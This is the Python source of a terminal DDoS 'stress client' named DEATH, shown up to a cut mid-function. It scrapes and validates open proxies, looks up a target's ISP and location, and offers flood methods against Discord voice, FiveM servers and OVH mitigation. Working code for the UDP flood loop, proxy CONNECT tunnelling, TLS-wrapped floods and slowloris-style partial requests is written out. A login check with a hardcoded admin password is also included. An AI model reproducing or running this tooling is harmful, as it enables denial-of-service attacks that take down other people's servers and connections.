#!/usr/bin/env python3
# ============================================================
#  DEATH — terminal stress client
# ============================================================
#  A single-file terminal application providing:
#    - user accounts (admin + created users)
#    - proxy scraping (static lists, dorks, aggregation APIs)
#    - proxy validation (TCP reachability, HTTP CONNECT, per-target)
#    - attack engine with multiple methods
#    - proxy rotation with failure tracking
#    - animated gradient terminal UI
#
#  Runs on Windows, Linux, macOS.
#  Works over SSH and through ngrok TCP tunnels.
#  Reads raw terminal bytes on POSIX, msvcrt on Windows.
#
#  Press S during scrape to stop early and save what was found.
#  Press Ctrl-C anywhere to exit cleanly.
# ============================================================

import os
import sys
import time
import math
import json
import random
import socket
import shutil
import threading
import ssl
import re
import struct
import string
import hashlib
import urllib.parse
import urllib.request
import urllib.error
from typing import Callable, Dict, List, Optional, Set, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
#  SECTION 1 — PLATFORM SETUP
# ============================================================
#  On Windows, ANSI escape sequences are disabled by default
#  in some terminal hosts. Enabling VT processing via
#  SetConsoleMode makes the gradient rendering work in
#  cmd.exe, conhost.exe, and Windows Terminal.

IS_WINDOWS = (os.name == "nt")

if IS_WINDOWS:
    # triggers VT100 mode on modern Windows terminals
    os.system("")
    try:
        import ctypes
        _k32 = ctypes.windll.kernel32
        _stdout_handle = _k32.GetStdHandle(-11)
        # 0x0004 = ENABLE_VIRTUAL_TERMINAL_PROCESSING
        # 0x0001 = ENABLE_PROCESSED_OUTPUT
        # 0x0002 = ENABLE_WRAP_AT_EOL_OUTPUT
        _k32.SetConsoleMode(_stdout_handle, 7)
    except Exception:
        # if enabling fails, gradients still render on modern hosts
        pass

# ============================================================
#  SECTION 2 — ANSI ESCAPE CODES
# ============================================================

ESC = "\x1b"
RESET = f"{ESC}[0m"
BOLD = f"{ESC}[1m"
DIM = f"{ESC}[2m"
ITALIC = f"{ESC}[3m"
UNDERLINE = f"{ESC}[4m"
BLINK = f"{ESC}[5m"

CLEAR = f"{ESC}[2J{ESC}[H"
HOME = f"{ESC}[H"
HIDE_CURSOR = f"{ESC}[?25l"
SHOW_CURSOR = f"{ESC}[?25h"
SAVE_CURSOR = f"{ESC}[s"
RESTORE_CURSOR = f"{ESC}[u"

def fg(r: int, g: int, b: int) -> str:
    """24-bit foreground color."""
    return f"{ESC}[38;2;{r};{g};{b}m"

def bg(r: int, g: int, b: int) -> str:
    """24-bit background color."""
    return f"{ESC}[48;2;{r};{g};{b}m"

def move(row: int, col: int) -> str:
    """Move cursor to absolute row, col."""
    return f"{ESC}[{row};{col}H"

def clear_line() -> str:
    return f"{ESC}[K"

# ============================================================
#  SECTION 3 — ASCII ASSETS
# ============================================================

BANNER_DEATH = r"""
 ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗
 ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║
 ██║  ██║█████╗  ███████║   ██║   ███████║
 ██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║
 ██████╔╝███████╗██║  ██║   ██║   ██║  ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
""".strip("\n")

EMBLEM = r"""
        _..od88888bo.._
      .d""'   888   '""b.
    .d"'      888      '"b.
   d"'        888        '"b
  d'          888          'b
 88          88888          88
(88         8888888         88)
 88        888888888        88
  YI      888 888 888      IP
   YI    888  888  888    IP
    "9. 888   888   888 .P"
      "888    888    888"
        `""Y8888888P""`
""".strip("\n")

SKULL_SMALL = r"""
     _..od88888bo.._
   .d""'   888   '""b.
  .d"'      888      '"b.
  d"'        888        '"b
 d'          888          'b
 88          88888          88
(88         8888888         88)
 88        888888888        88
  YI      888 888 888      IP
   YI    888  888  888    IP
    "9. 888   888   888 .P"
      "888    888    888"
        `""Y8888888P""`
""".strip("\n")

COMMANDS = [
    ("clear",        "clear screen"),
    ("exit",         "log out"),
    ("help",         "show commands"),
    ("home",         "redraw the full banner"),
    ("methods",      "list methods"),
    ("ongoing",      "show running attacks"),
    ("online",       "who is online"),
    ("passwd",       "change your password"),
    ("plan",         "show your account"),
    ("queue",        "your queued attacks"),
    ("scheduled",    "scheduled attacks"),
    ("theme",        "switch theme"),
    ("themes",       "list themes"),
    ("addusr",       "admin: create account"),
    ("delusr",       "admin: delete account"),
    ("users",        "admin: list accounts"),
    ("scrape",       "scrape + validate fresh proxies"),
    ("validate",     "re-check proxies against a host"),
    ("proxies",      "show proxy pool status"),
    ("clearproxies", "wipe your proxy pool"),
    ("status",       "show system status"),
    ("stop",         "stop the current attack"),
    ("stats",        "show session statistics"),
    ("whoami",       "show your account"),
    ("time",         "show current time"),
    ("ascii",        "print an ascii asset"),
]

METHODS = [
    ("UDP Methods", [
        ("udp",     "High Gbps udp flood"),
        ("pps",     "High pps udp flood"),
        ("hold",    "low bandwidth home hold"),
        ("discord", "Discord VC flood"),
    ]),
    ("TCP Methods", [
        ("tcp",     "mixed flagged TCP flood"),
        ("ovh",     "mixed tcp for ovh vac"),
        ("fiveM",   "tcp flood for fivem server"),
        ("socket",  "high rate tcp socket flood"),
    ]),
    ("Layer 7", [
        ("tls",       "https TLS flood"),
        ("https",     "mixed https flood"),
        ("browser",   "real browser emulations"),
        ("slowloris", "slow header hold"),
        ("http2",     "http/2 rapid flood"),
    ]),
]

METHOD_INFO = {
    "udp":        "Raw UDP flood. Sends large datagrams at high rate to the target. Local sockets only.",
    "pps":        "High packets-per-second UDP flood. Small datagrams, maximum send rate.",
    "hold":       "Low bandwidth home hold. Sustained UDP stream to keep a home connection saturated.",
    "discord":    "Discord voice flood. Sends RTP/STUN-shaped UDP to media port range.",
    "tcp":        "Mixed TCP flood. Proxy-backed HTTP GET + raw TCP connect workers.",
    "ovh":        "Mixed TCP flood tuned against OVH VAC. Uses standard GET pattern.",
    "fiveM":      "TCP flood for FiveM servers. Hits the game port with HTTP-shaped payloads.",
    "socket":     "High rate TCP socket flood. Fast connect and disconnect cycles.",
    "tls":        "TLS flood through proxies. Opens CONNECT tunnels then full TLS handshakes.",
    "https":      "Mixed HTTPS flood. Rotates request paths, headers, user agents.",
    "browser":    "Real browser emulation. Sends full Chrome-like header set.",
    "slowloris":  "Slow header hold. Keeps many sockets open with partial requests.",
    "http2":      "HTTP/2 rapid reset concept. Opens many streams per connection.",
}

THEMES = {
    "purple":  {"accent": (170, 60, 255), "dim": (55, 15, 90)},
    "violet":  {"accent": (140, 40, 220), "dim": (45, 10, 75)},
    "orchid":  {"accent": (218, 112, 214),"dim": (80, 30, 80)},
    "bloody":  {"accent": (220, 20, 30),  "dim": (80, 8, 12)},
    "crimson": {"accent": (255, 40, 80),  "dim": (100, 15, 30)},
    "matrix":  {"accent": (30, 255, 80),  "dim": (5, 80, 20)},
    "ice":     {"accent": (100, 200, 255),"dim": (30, 70, 100)},
    "mono":    {"accent": (230, 230, 230),"dim": (90, 90, 90)},
    "ember":   {"accent": (255, 120, 30), "dim": (100, 40, 5)},
    "venom":   {"accent": (130, 220, 40), "dim": (45, 80, 10)},
    "gold":    {"accent": (255, 200, 60), "dim": (100, 75, 15)},
    "rose":    {"accent": (255, 120, 180),"dim": (100, 40, 70)},
}

# ============================================================
#  SECTION 4 — CONSTANTS
# ============================================================

USERS_FILE = "users.json"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (PlayStation 5 3.01) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/609.4 (KHTML, like Gecko)",
    "curl/8.4.0",
    "python-requests/2.31.0",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.reddit.com/",
    "https://www.youtube.com/",
    "https://www.amazon.com/",
    "https://github.com/",
    "https://stackoverflow.com/",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
    "en-US,en;q=0.5",
]

PROXY_RE_SIMPLE = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})")

# ============================================================
#  SECTION 5 — USER STORE
# ============================================================

def load_users() -> Dict[str, str]:
    """Load the users JSON. Returns {username: password}."""
    try:
        with open(USERS_FILE) as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
        return {}
    except Exception:
        return {}

def save_users(users: Dict[str, str]):
    """Persist the users map."""
    try:
        with open(USERS_FILE, "w") as f:
            json.dump(users, f, indent=2, sort_keys=True)
    except Exception:
        pass

def user_exists(username: str) -> bool:
    if username == "admin":
        return True
    return username in S.users

def verify_user(username: str, password: str) -> Tuple[bool, bool]:
    """Returns (ok, is_admin)."""
    if username == "admin" and password == "1987":
        return True, True
    users = S.users
    if username in users and users[username] == password:
        return True, False
    return False, False

# ============================================================
#  SECTION 6 — PROXY STORE
# ============================================================

def proxy_file(username: str) -> str:
    """Path to the per-user proxy store."""
    safe = "".join(c for c in username if c.isalnum() or c in "_-") or "guest"
    return f"proxies_{safe}.json"

def load_proxies(username: str) -> Dict[str, dict]:
    """Load the per-user proxy map. {proxy: {last_ok, ok_count, raw}}."""
    try:
        with open(proxy_file(username)) as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
        return {}
    except Exception:
        return {}

def save_proxies(username: str, proxies: Dict[str, dict]):
    """Persist the per-user proxy map."""
    try:
        with open(proxy_file(username), "w") as f:
            json.dump(proxies, f, indent=2)
    except Exception:
        pass

# ============================================================
#  SECTION 7 — STATE
# ============================================================

class State:
    def __init__(self):
        self.username = ""
        self.is_admin = False
        self.theme_name = "purple"
        self.running = True
        self.frame = 0
        self.log: List[str] = []
        self.current_view = "home"
        self.input_buffer = ""
        self.cursor_pos = 0

        self.attacks: List[Dict] = []
        self.online_users = ["death", "root", "admin", "guest", "ops"]
        self.scheduled: List[Dict] = []
        self.queue: List[Dict] = []
        self.users: Dict[str, str] = load_users()

        self.attack_screen: Optional[Dict] = None
        self.attack_frame = 0
        self.attack_thread: Optional[threading.Thread] = None
        self.attack_stop = threading.Event()

        self.proxies: Dict[str, dict] = {}
        self.scraping = False
        self.scrape_stop = threading.Event()
        self.log_lock = threading.Lock()

        self.session_start = time.time()
        self.total_sent = 0
        self.total_failed = 0
        self.attacks_run = 0

    @property
    def theme(self):
        return THEMES.get(self.theme_name, THEMES["purple"])

    def log_line(self, text: str, cap: int = 500):
        with self.log_lock:
            self.log.append(text)
            if len(self.log) > cap:
                self.log = self.log[-cap:]

S = State()

# ============================================================
#  SECTION 8 — RENDER HELPERS
# ============================================================

def term_size() -> Tuple[int, int]:
    """Live terminal size. Re-queried every frame for puTTY resize."""
    sz = shutil.get_terminal_size((120, 40))
    return sz.columns, sz.lines

def lerp(a: int, b: int, t: float) -> int:
    """Linear interpolate between a and b."""
    return int(a + (b - a) * t)

def clamp(v: int, lo: int, hi: int) -> int:
    return max(lo, min(hi, v))

def gradient_sweep(line: str, frame: int, theme, phase: float = 0.0) -> str:
    """Paint a moving gradient across a line of text."""
    if not line:
        return line
    ar, ag, ab = theme["accent"]
    dr, dg, db = theme["dim"]
    width = len(line)
    period = width * 2
    out = []
    for i, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        x = (i + frame * 3 + int(phase * width)) % period
        if x > width:
            x = period - x
        t = x / max(1, width)
        pulse = math.sin(t * math.pi)
        pulse = clamp(int(pulse * 1000), 0, 1000) / 1000.0
        r = lerp(dr, ar, pulse)
        g = lerp(dg, ag, pulse)
        b = lerp(db, ab, pulse)
        out.append(f"{fg(r,g,b)}{ch}")
    return "".join(out) + RESET

def solid(line: str, theme, mode: str = "accent") -> str:
    r, g, b = theme[mode]
    return f"{fg(r,g,b)}{line}{RESET}"

def visible_len(s: str) -> int:
    """Strip ANSI escape sequences and count visible characters."""
    out = 0
    i = 0
    while i < len(s):
        if s[i] == "\x1b":
            j = s.find("m", i)
            if j == -1:
                break
            i = j + 1
        else:
            out += 1
            i += 1
    return out

def pad_visible(s: str, width: int) -> str:
    return s + " " * max(0, width - visible_len(s))

def center_visible(s: str, width: int) -> str:
    pad = max(0, (width - visible_len(s)) // 2)
    return " " * pad + s

def emblem_animated(frame: int, theme) -> List[str]:
    """The emblem with a vertical scanline pulse."""
    lines = EMBLEM.split("\n")
    ar, ag, ab = theme["accent"]
    dr, dg, db = theme["dim"]
    out = []
    height = len(lines)
    for y, line in enumerate(lines):
        phase = (y / max(1, height) + frame * 0.05) % 1.0
        pulse = math.sin(phase * math.pi)
        pulse = max(0.15, pulse)
        r = lerp(dr, ar, pulse)
        g = lerp(dg, ag, pulse)
        b = lerp(db, ab, pulse)
        out.append(f"{fg(r,g,b)}{line}{RESET}")
    return out

# ============================================================
#  SECTION 9 — TARGET LOOKUP
# ============================================================

_target_cache: Dict[str, Tuple[float, Dict[str, str]]] = {}
_target_cache_lock = threading.Lock()

def lookup_target(host: str) -> Dict[str, str]:
    """Resolve the host and query ip-api for ASN/ISP/geo.
    Result is cached for 5 minutes to avoid hammering."""
    now = time.time()
    with _target_cache_lock:
        cached = _target_cache.get(host)
        if cached and now - cached[0] < 300:
            return cached[1]

    info = {"ip": "?", "asn": "?", "isp": "?", "city": "?", "state": "?", "country": "?"}
    try:
        info["ip"] = socket.gethostbyname(host)
    except Exception:
        with _target_cache_lock:
            _target_cache[host] = (now, info)
        return info

    try:
        url = (
            "http://ip-api.com/json/"
            + info["ip"]
            + "?fields=status,country,regionName,city,isp,as,query"
        )
        with urllib.request.urlopen(url, timeout=6) as r:
            data = json.loads(r.read().decode("utf-8", errors="ignore"))
        if data.get("status") == "success":
            info["asn"] = data.get("as", "?")
            info["isp"] = data.get("isp", "?")
            info["city"] = data.get("city", "?")
            info["state"] = data.get("regionName", "?")
            info["country"] = data.get("country", "?")
    except Exception:
        pass

    with _target_cache_lock:
        _target_cache[host] = (now, info)
    return info

# ============================================================
#  SECTION 10 — PROXY SCRAPING SOURCES
# ============================================================

PROXY_SOURCES = [
    # ---------- TheSpeedX ----------
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    # ---------- monosans ----------
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    # ---------- clarketm ----------
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    # ---------- ShiftyTR ----------
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    # ---------- hookzof ----------
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    # ---------- roosterkid ----------
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    # ---------- jetkai ----------
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    # ---------- zloi-user ----------
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
    # ---------- mmpx12 ----------
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    # ---------- proxyscrape API ----------
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
    # ---------- proxy-list.download ----------
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    # ---------- openproxylist ----------
    "https://openproxylist.xyz/http.txt",
    "https://openproxylist.xyz/socks4.txt",
    "https://openproxylist.xyz/socks5.txt",
]

DORK_QUERIES = [
    "site:pastebin.com \"proxy list\" http",
    "site:pastebin.com \"socks5\" proxy list",
    "site:pastebin.com \"socks4\" proxy list",
    "site:gist.github.com \"proxy\" \"ip:port\"",
    "site:gist.github.com \"socks5\" \"ip:port\"",
    "inurl:proxy.txt",
    "inurl:http.txt \"proxy\"",
    "inurl:socks5.txt",
    "inurl:socks4.txt",
    "inurl:proxies.txt",
    "intext:\"ip:port\" \"proxy\" filetype:txt",
]

# ============================================================
#  SECTION 11 — PROXY SCRAPING FUNCTIONS
# ============================================================

def _valid_ip(ip: str) -> bool:
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    for p in parts:
        try:
            n = int(p)
            if n < 0 or n > 255:
                return False
        except ValueError:
            return False
    return True

def fetch_url(url: str, timeout: int = 10) -> str:
    """Fetch a URL, ignore TLS errors, return body as text or empty."""
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": random.choice(USER_AGENTS)},
        )
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read()
            return body.decode("utf-8", errors="ignore")
    except Exception:
        return ""

def extract_proxies(text: str) -> Set[str]:
    """Regex ip:port out of arbitrary text."""
    out: Set[str] = set()
    if not text:
        return out
    for m in PROXY_RE_SIMPLE.finditer(text):
        ip, port = m.group(1), m.group(2)
        if _valid_ip(ip) and 0 < int(port) < 65536:
            out.add(f"{ip}:{port}")
    return out

def _fetch_one_source(url: str) -> Set[str]:
    return extract_proxies(fetch_url(url, timeout=8))

def _ddg_dork(query: str, limit: int = 8) -> List[str]:
    """Run a dork query through DuckDuckGo HTML and return result URLs."""
    urls: List[str] = []
    try:
        q = urllib.parse.quote(query)
        html = fetch_url(f"https://html.duckduckgo.com/html/?q={q}", timeout=8)
        for m in re.finditer(r'href="(https?://[^"]+)"', html):
            u = m.group(1)
            if "duckduckgo.com" in u:
                continue
            if u in urls:
                continue
            urls.append(u)
            if len(urls) >= limit:
                break
    except Exception:
        pass
    return urls

def scrape_all_proxies(on_progress: Callable[[str], None],
                       stop: threading.Event) -> Set[str]:
    """
    Phase 1: fetch all static source URLs in parallel.
    Phase 2: run dork queries in parallel and fetch the linked pages.
    Returns the union of extracted ip:port strings.
    """
    found: Set[str] = set()

    on_progress(f"fetching {len(PROXY_SOURCES)} sources in parallel...")
    with ThreadPoolExecutor(max_workers=40) as ex:
        futures = [ex.submit(_fetch_one_source, u) for u in PROXY_SOURCES]
        done = 0
        for fut in as_completed(futures):
            if stop.is_set():
                break
            done += 1
            try:
                found |= fut.result()
            except Exception:
                pass
            if done % 8 == 0:
                on_progress(f"  sources {done}/{len(PROXY_SOURCES)} — pool: {len(found)}")
    if stop.is_set():
        on_progress(f"stopped early — {len(found)} raw candidates")
        return found
    on_progress(f"source phase complete: {len(found)} raw candidates")

    on_progress(f"running {len(DORK_QUERIES)} dorks in parallel...")
    dork_links: List[str] = []
    with ThreadPoolExecutor(max_workers=12) as ex:
        futures = [ex.submit(_ddg_dork, q, 8) for q in DORK_QUERIES]
        for fut in as_completed(futures):
            if stop.is_set():
                break
            try:
                dork_links.extend(fut.result())
            except Exception:
                pass

    if not stop.is_set() and dork_links:
        # dedupe
        dork_links = list(dict.fromkeys(dork_links))
        on_progress(f"  fetched {len(dork_links)} dork links, extracting...")
        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = [ex.submit(fetch_url, u, 6) for u in dork_links]
            done = 0
            for fut in as_completed(futures):
                if stop.is_set():
                    break
                done += 1
                try:
                    found |= extract_proxies(fut.result())
                except Exception:
                    pass
                if done % 10 == 0:
                    on_progress(f"  dork pages {done}/{len(dork_links)} — pool: {len(found)}")

    on_progress(f"scrape phase complete: {len(found)} unique candidates")
    return found

# ============================================================
#  SECTION 12 — PROXY VALIDATION
# ============================================================

def tcp_reachable(proxy: str, timeout: float = 2.0) -> bool:
    """Fast filter — can we open a TCP socket to the proxy?"""
    try:
        host, port = proxy.split(":")
        port = int(port)
        s = socket.create_connection((host, port), timeout=timeout)
        try:
            s.close()
        except Exception:
            pass
        return True
    except Exception:
        return False

def http_proxy_alive(proxy: str, timeout: float = 4.0) -> bool:
    """CONNECT to a fast canary through the proxy."""
    try:
        host, port = proxy.split(":")
        port = int(port)
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        canary = "www.google.com:80"
        req = (
            f"CONNECT {canary} HTTP/1.1\r\n"
            f"Host: {canary}\r\n"
            f"\r\n"
        )
        s.sendall(req.encode())
        resp = s.recv(128)
        try:
            s.close()
        except Exception:
            pass
        return b"200" in resp
    except Exception:
        return False

def proxy_can_reach_target(proxy: str, target_host: str, target_port: int,
                           timeout: float = 5.0) -> bool:
    """Preflight: can this proxy CONNECT to the actual attack target?"""
    try:
        proxy_host, proxy_port = proxy.split(":")
        proxy_port = int(proxy_port)
        s = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
        s.settimeout(timeout)
        connect_req = (
            f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
            f"Host: {target_host}:{target_port}\r\n"
            f"\r\n"
        )
        s.sendall(connect_req.encode())
        resp = s.recv(256)
        try:
            s.close()
        except Exception:
            pass
        return b"200" in resp
    except Exception:
        return False

def scrape_and_validate(on_progress: Callable[[str], None],
                        stop: threading.Event) -> Dict[str, dict]:
    """
    Full pipeline:
      1. scrape all sources
      2. TCP reachability filter (1000 workers)
      3. HTTP CONNECT validation (500 workers)
    Returns the alive proxy map.
    """
    candidates = scrape_all_proxies(on_progress, stop)
    if not candidates:
        on_progress("no candidates found")
        return {}

    if stop.is_set():
        on_progress(f"stopped — keeping {len(candidates)} raw candidates (unvalidated)")
        return {p: {"last_ok": 0, "ok_count": 0, "raw": True} for p in candidates}

    on_progress(f"tcp-reachability filter on {len(candidates)} proxies...")
    reachable: List[str] = []
    done = 0
    total = len(candidates)
    with ThreadPoolExecutor(max_workers=1000) as ex:
        futures = {ex.submit(tcp_reachable, p): p for p in candidates}
        for fut in as_completed(futures):
            if stop.is_set():
                for f in futures:
                    f.cancel()
                break
            done += 1
            try:
                if fut.result():
                    reachable.append(futures[fut])
            except Exception:
                pass
            if done % 200 == 0:
                on_progress(f"  tcp {done}/{total} — reachable: {len(reachable)}")

    on_progress(f"tcp filter done: {len(reachable)} reachable")
    if stop.is_set():
        return {p: {"last_ok": time.time(), "ok_count": 0, "raw": True} for p in reachable}

    on_progress(f"http-validating {len(reachable)} proxies...")
    alive: Dict[str, dict] = {}
    done = 0
    total = len(reachable)
    with ThreadPoolExecutor(max_workers=500) as ex:
        futures = {ex.submit(http_proxy_alive, p): p for p in reachable}
        for fut in as_completed(futures):
            if stop.is_set():
                for f in futures:
                    f.cancel()
                break
            done += 1
            try:
                if fut.result():
                    alive[futures[fut]] = {
                        "last_ok": time.time(),
                        "ok_count": 1,
                        "raw": False,
                    }
            except Exception:
                pass
            if done % 100 == 0:
                on_progress(f"  http {done}/{total} — alive: {len(alive)}")

    on_progress(f"validation done: {len(alive)} working proxies")
    return alive

# ============================================================
#  SECTION 13 — ATTACK PRIMITIVES
# ============================================================

def build_request(method: str, host: str, port: int, path: str = "/") -> Tuple[str, str]:
    """Build an HTTP request string and determine scheme."""
    scheme = "https" if (method in ("tls", "https", "browser", "slowloris", "http2") or port == 443) else "http"
    ua = random.choice(USER_AGENTS)
    ref = random.choice(REFERERS)
    lang = random.choice(ACCEPT_LANGS)

    if method == "browser":
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
            f"Accept-Language: {lang}\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Referer: {ref}\r\n"
            f"Connection: keep-alive\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"Sec-Fetch-Dest: document\r\n"
            f"Sec-Fetch-Mode: navigate\r\n"
            f"Sec-Fetch-Site: cross-site\r\n"
            f"Sec-Fetch-User: ?1\r\n"
            f"Cache-Control: max-age=0\r\n"
            f"\r\n"
        )
    elif method == "slowloris":
        # partial request — no terminating CRLFCRLF
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"X-Padding: {random.randint(1, 999999)}\r\n"
        )
    else:
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Language: {lang}\r\n"
            f"Referer: {ref}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
    return req, scheme

def open_tunnel(proxy: str, host: str, port: int, scheme: str,
                timeout: float = 5.0) -> Optional[socket.socket]:
    """Open a socket through an HTTP proxy to the target. Returns None on failure."""
    try:
        proxy_host, proxy_port = proxy.split(":")
        proxy_port = int(proxy_port)
        s = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
        s.settimeout(timeout)
        connect_req = (
            f"CONNECT {host}:{port} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"\r\n"
        )
        s.sendall(connect_req.encode())
        resp = s.recv(512)
        if b"200" not in resp:
            try:
                s.close()
            except Exception:
                pass
            return None
        if scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        return s
    except Exception:
        return None

def open_direct(host: str, port: int, scheme: str,
                timeout: float = 4.0) -> Optional[socket.socket]:
    """Open a direct socket to the target."""
    try:
        if scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = socket.create_connection((host, port), timeout=timeout)
            s = ctx.wrap_socket(s, server_hostname=host)
        else:
            s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        return s
    except Exception:
        return None

# ── raw UDP flood ────────────────────────────────────────
def raw_udp_flood(host: str, port: int, stop: threading.Event, stats: dict):
    """Fire random UDP datagrams at the target. Local socket only."""
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return
    addr = (ip, port)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except Exception:
            pass
    except Exception:
        return

    payload_pool = [os.urandom(random.randint(512, 1400)) for _ in range(128)]
    while not stop.is_set():
        try:
            s.sendto(random.choice(payload_pool), addr)
            stats["sent"] = stats.get("sent", 0) + 1
        except Exception:
            stats["failed"] = stats.get("failed", 0) + 1
    try:
        s.close()
    except Exception:
        pass

# ── discord voice flood ──────────────────────────────────
def _rtp_packet() -> bytes:
    """Construct an RTP-shaped UDP payload."""
    version_pt = 0x80
    payload_type = random.choice([96, 97, 98, 111, 120]) & 0x7F
    seq = random.randint(0, 0xFFFF)
    ts = random.randint(0, 0xFFFFFFFF)
